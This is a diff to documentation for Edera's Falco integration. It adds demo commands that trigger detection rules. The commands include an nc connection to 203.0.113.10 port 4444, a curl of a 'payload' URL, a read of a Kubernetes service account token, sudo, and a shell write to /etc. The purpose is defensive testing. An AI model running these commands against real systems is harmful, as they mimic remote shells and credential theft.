@@ -465,7 +465,7 @@ Configure the Edera Falco plugin
 ```
 sudo cat /etc/falco/config.d/falco-edera-config.yaml
 ```
-Install Edera detection rules
+Install the **10 custom** Edera detection rules
 ```
 sudo cat /etc/falco/rules.d/falco-edera-rules.yaml
 ```
@@ -528,5 +528,25 @@ protect workload exec llm-app nc 203.0.113.10 4444
 
 **[Detect outbound network connections](https://docs.edera.dev/guides/observability/falco-integration/#detect-outbound-network-connections)**
 ```
-protect workload exec llm-app curl https://example.com
+protect workload exec llm-app curl https://example.com/payload
+```
+
+**Edera privilege escalation**
+```
+protect workload exec llm-app sudo id
+```
+
+**Edera ServiceAccount access** (and the broader **sensitive-read** rule where applicable)
+```
+protect workload exec llm-app cat /var/run/secrets/kubernetes.io/serviceaccount/token
+```
+
+**Edera sensitive file write** + **Edera shell command execution**
+```
+protect workload exec llm-app /bin/sh -c "echo demo > /etc/demo.conf"
+```
+
+The accumulated detections continue to appear in the logs:
+```
+kubectl logs -n falco -l app.kubernetes.io/name=falco -f
 ```
